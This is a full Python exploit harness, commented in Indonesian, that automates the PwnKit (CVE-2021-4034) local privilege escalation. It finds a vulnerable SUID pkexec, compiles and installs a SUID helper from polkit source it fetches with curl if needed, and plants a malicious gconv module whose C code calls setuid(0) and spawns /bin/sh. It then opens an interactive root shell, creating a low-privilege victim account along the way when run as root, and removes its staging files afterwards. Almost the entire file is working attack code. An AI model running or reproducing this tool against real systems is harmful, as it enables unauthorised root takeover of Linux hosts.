#!/usr/bin/env python3
"""
lpe_mini.py v2 - full-auto local LPE harness (CVE-2021-4034 / PwnKit).

Jalankan TANPA argumen:
    python3 lpe_mini.py

  -> deteksi pintar TANPA hash hardcoded, TANPA path hardcoded, TANPA user:
     1. temukan pkexec SUID sendiri (which + SUID scan)
     2. versi + marker distro + dpkg/rpm --verify (deteksi binary ditukar/tampered)
     3. VULN -> temukan/bangun helper SUID sendiri (source di-download bila perlu)
     4. staging di lokasi cerdas (home -> /dev/shm -> /tmp, skip noexec)
     5. korban user otomatis (non-root = diri sendiri; root = user low-priv
        yang ada atau dibuatkan otomatis)
     6. LANGSUNG masuk root shell interaktif; keluar = bersih.

Flag opsional:
    --detect   : hanya deteksi, tanpa exploit
    --user U   : paksa user korban (default: auto)
    --cve ID   : default CVE-2021-4034
"""
import argparse
import getpass
import os
import pty
import random
import re
import shutil
import string
import subprocess
import sys
import tempfile

CVE = "CVE-2021-4034"
HELPER_DEST = "/usr/local/bin/pwnkit-suidexec"
PKEXEC_SRC_URL = (
    "https://gitlab.freedesktop.org/polkit/polkit/-/raw/0.105/src/programs/pkexec.c"
)

WRAPPER_C = r'''
#include <stdlib.h>

extern char **environ;
extern int pkexec_main(int argc, char **argv);

int main(void)
{
    /* Contiguous argv/envp mirroring the kernel's pre-5.1 execve stack
       when called with an empty argv (argc == 0):
       argv[1] aliases envp[0] -> the OOB read/write primitive of CVE-2021-4034. */
    static char *stack[] = {
        NULL,                    /* argv[0] (argc == 0)                  */
        ".pwnkit",               /* envp[0] -> read OOB as argv[1],
                                    then overwritten OOB by argv[1]=path */
        "PATH=GCONV_PATH=.",
        "CHARSET=PWNKIT",
        "SHELL=pwnkit",
        "GCONV_PATH=./.pwnkit",
        NULL
    };
    environ = &stack[1];
    return pkexec_main(0, &stack[0]);
}
'''

CONFIG_H = r'''
#define PACKAGE_NAME "polkit"
#define PACKAGE_VERSION "0.105"
#define PACKAGE_STRING "polkit 0.105"
#define GETTEXT_PACKAGE "polkit-1"
#define LOCALEDIR "/usr/share/locale"
#define PACKAGE_BUGREPORT "https://gitlab.freedesktop.org/polkit/polkit/issues"
'''

MODULE_C = r'''#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void gconv(void) {}
void gconv_init(void *step) {
    setuid(0); setgid(0); seteuid(0); setegid(0);
    setenv("PATH", "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", 1);
    setenv("PS1", "[pwnkit] root# ", 1);
    system("/bin/sh");
    _exit(0);
}
'''


def sh(cmd, **kw):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True, **kw)


def out(cmd):
    return subprocess.run(cmd, capture_output=True, text=True).stdout


# ---------------- smart discovery (tanpa hash / path hardcoded) ----------------

def discover_pkexec():
    cands = []
    if os.path.exists("/usr/bin/pkexec"):
        cands.append("/usr/bin/pkexec")
    w = sh("command -v pkexec").stdout.strip()
    if w and os.path.exists(w) and w not in cands:
        cands.append(w)
    r = sh("find / -xdev -perm -4000 -type f -name 'pkexec' 2>/dev/null").stdout
    for line in r.splitlines():
        p = line.strip()
        if p and p not in cands:
            cands.append(p)
    return cands


def is_suid(path):
    try:
        st = os.stat(path)
        return st.st_uid == 0 and (st.st_mode & 0o4000)
    except OSError:
        return False


def pkexec_version(path):
    if not is_suid(path):
        return None
    m = re.search(r"pkexec\s+version\s+([\d.]+)", sh(f"{path} --version 2>&1").stdout)
    return m.group(1) if m else None


def pkg_info():
    """(pkg_version, tampered, patched_marker) - tanpa hash."""
    pkg, tampered = "", False
    if os.path.exists("/usr/bin/dpkg"):
        pkg = subprocess.run(
            ["dpkg-query", "-W", "-f=${Version}", "pkexec"],
            capture_output=True, text=True,
        ).stdout.strip()
        # dpkg --verify: karakter ke-3 bernilai '5' = md5sum mismatch
        for line in sh("dpkg --verify pkexec 2>/dev/null").stdout.splitlines():
            f = line.split()
            if f and len(f) >= 2 and f[0][2] == "5":
                tampered = True
    elif sh("command -v rpm").stdout.strip():
        pkg = sh("rpm -q --qf %{VERSION}-%{RELEASE} polkit 2>/dev/null").stdout.strip()
        tampered = bool(sh("rpm -V polkit 2>/dev/null").stdout.strip())
    marker = bool(pkg) and bool(re.search(r"(ubuntu|deb\d+u|el\d+[_\.]|\.el\d)", pkg))
    return pkg, tampered, marker


def smart_verdict():
    """VULN / PATCHED / NOT_VULNERABLE / NO_PKEXEC."""
    for c in discover_pkexec():
        v = pkexec_version(c)
        if v:
            parts = v.split(".")
            if int(parts[0]) > 0 or int(parts[1]) >= 120:
                return "NOT_VULNERABLE", v, c
            _, tampered, marker = pkg_info()
            if tampered:
                return "VULN", v, c      # binary beda dari paket distro (swap lab)
            if marker:
                return "PATCHED", v, c   # paket distro sudah di-patch
            return "VULN", v, c
    return "NO_PKEXEC", None, None


def discover_helper():
    if is_suid(HELPER_DEST):
        return HELPER_DEST
    r = sh("find / -xdev -perm -4000 -type f -name '*pwnkit*' 2>/dev/null").stdout
    for line in r.splitlines():
        p = line.strip()
        if p and p != HELPER_DEST and is_suid(p):
            return p
    return None


def find_pkexec_source():
    here = os.path.dirname(os.path.abspath(__file__))
    for c in (os.path.join(here, "pkexec.c"), "/root/lpe-lab/pkexec.c"):
        if os.path.exists(c):
            return c
    for line in sh("find / -xdev -name 'pkexec.c' -path '*polkit*' 2>/dev/null").stdout.splitlines():
        p = line.strip()
        if p and os.path.exists(p):
            return p
    return None


def build_helper(work):
    """Build SUID helper dari source ditemukan / di-download. Butuh root."""
    if os.geteuid() != 0:
        return None
    src = find_pkexec_source()
    if not src:
        dl = os.path.join(work, "pkexec.c")
        if sh(f"curl -fsSL -o {dl} {PKEXEC_SRC_URL} 2>/dev/null").returncode != 0:
            return None
        src = dl
    cfg, wrap = os.path.join(work, "config.h"), os.path.join(work, "wrapper.c")
    with open(cfg, "w") as f:
        f.write(CONFIG_H)
    with open(wrap, "w") as f:
        f.write(WRAPPER_C)
    obj = os.path.join(work, "pkexec.o")
    cflags = sh("pkg-config --cflags glib-2.0 gio-2.0").stdout.strip()
    libs = sh(
        "pkg-config --libs glib-2.0 gio-2.0 polkit-gobject-1 polkit-agent-1"
    ).stdout.strip()
    if sh(f"gcc -c -o {obj} {src} -Dmain=pkexec_main -DHAVE_CONFIG_H "
          f"-DHAVE_CLEARENV -DPOLKIT_AUTHFW_PAM -I{work} {cflags} "
          f"-Wno-deprecated-declarations").returncode != 0:
        return None
    binf = os.path.join(work, "pwnkit-suidexec")
    if sh(f"gcc -o {binf} {wrap} {obj} {libs} -lpam").returncode != 0:
        return None
    if sh(f"install -o root -g root -m 4755 {binf} {HELPER_DEST}").returncode != 0:
        return None
    return HELPER_DEST if is_suid(HELPER_DEST) else None


# ---------------- smart staging & user ----------------

def noexec_mount(path):
    path = os.path.realpath(path)
    best = ("", 0)
    try:
        for line in open("/proc/mounts"):
            parts = line.split()
            if len(parts) >= 6 and path.startswith(parts[1]) and len(parts[1]) >= best[1]:
                best = (parts[3], len(parts[1]))
    except OSError:
        return False
    return "noexec" in best[0].split(",")


def smart_base(user):
    try:
        home = sh(f"getent passwd {user}").stdout.split(":")[5]
    except (IndexError, AttributeError):
        home = ""
    for c in [home] + ["/dev/shm", "/tmp", "/var/tmp"]:
        if c and os.path.isdir(c) and os.access(c, os.W_OK) and not noexec_mount(c):
            return c
    return "/tmp"


def stage(user, base):
    work = tempfile.mkdtemp(prefix=".pwt-", dir=base)
    os.makedirs(work + "/GCONV_PATH=.", exist_ok=True)
    os.makedirs(work + "/.pwnkit", exist_ok=True)
    open(work + "/GCONV_PATH=./.pwnkit", "w").close()
    os.chmod(work + "/GCONV_PATH=./.pwnkit", 0o755)
    with open(work + "/.pwnkit/gconv-modules", "w") as f:
        f.write("module UTF-8// PWNKIT// pwnkit 2\n")
    with open(work + "/.pwnkit/pwnkit.c", "w") as f:
        f.write(MODULE_C)
    sh(f"gcc -shared -fPIC -o {work}/.pwnkit/pwnkit.so {work}/.pwnkit/pwnkit.c")
    if user:
        subprocess.run(["chown", "-R", f"{user}:{user}", work], check=True)
    return work


def auto_user():
    """Non-root = escalate diri sendiri. Root = korban low-priv auto."""
    if os.geteuid() != 0:
        return getpass.getuser()
    for u in ("pwnlab", "strictlab", "anonlab"):
        if sh(f"id -u {u} 2>/dev/null").returncode == 0:
            return u
    for line in open("/etc/passwd"):
        parts = line.split(":")
        if len(parts) > 6 and parts[2].isdigit():
            uid, shell = int(parts[2]), parts[6].strip()
            if 1000 <= uid < 60000 and shell in ("/bin/bash", "/bin/sh", "/usr/bin/bash"):
                return parts[0]
    name = "labauto" + "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
    pw = "".join(random.choices(string.ascii_letters + string.digits, k=16))
    sh(f"useradd -m -s /bin/bash {name}")
    sh(f"echo '{name}:{pw}' | chpasswd")
    return name


def exploit(user, helper):
    base = smart_base(user)
    work = stage(user, base)
    helper = os.path.abspath(helper)
    if os.geteuid() == 0:
        cmd = ["su", "-", user, "-c", f"cd {work} && exec {helper}"]
    else:
        cmd = ["/bin/bash", "-c", f"cd {work} && exec {helper}"]
    try:
        pty.spawn(cmd)
    except Exception as e:
        print(f"[FAIL] {user} => {e}")
        shutil.rmtree(work, ignore_errors=True)
        return 5
    shutil.rmtree(work, ignore_errors=True)   # staging bersih setelah shell ditutup
    return 0


def main():
    ap = argparse.ArgumentParser(add_help=True)
    ap.add_argument("--cve", default=CVE)
    ap.add_argument("--detect", action="store_true")
    ap.add_argument("--user", default=None)
    args = ap.parse_args()

    if args.cve != CVE:
        print(f"[FAIL] => hanya mendukung {CVE}")
        return 2

    verdict, ver, path = smart_verdict()
    kernel = out(["uname", "-r"]).strip()
    who = getpass.getuser()

    if verdict != "VULN":
        print(f"[SKIP] {who} => {verdict} (pkexec {ver or '?'}, kernel {kernel})")
        return 0

    print(f"[OK] {who} => VULN (pkexec {ver}, kernel {kernel}, {CVE})")

    if args.detect:
        return 0

    user = args.user or auto_user()
    helper = discover_helper()
    if not helper:
        wt = tempfile.mkdtemp(prefix=".pwb-", dir="/tmp")
        helper = build_helper(wt)
    if not helper:
        if os.geteuid() != 0:
            print(f"[SKIP] {who} => BLOCKED (kernel {kernel} menormalisasi argc=0; "
                  f"helper SUID tidak ditemukan dan build butuh root)")
        else:
            print("[FAIL] => helper SUID gagal dibangun")
        return 4

    return exploit(user, helper)


if __name__ == "__main__":
    sys.exit(main())
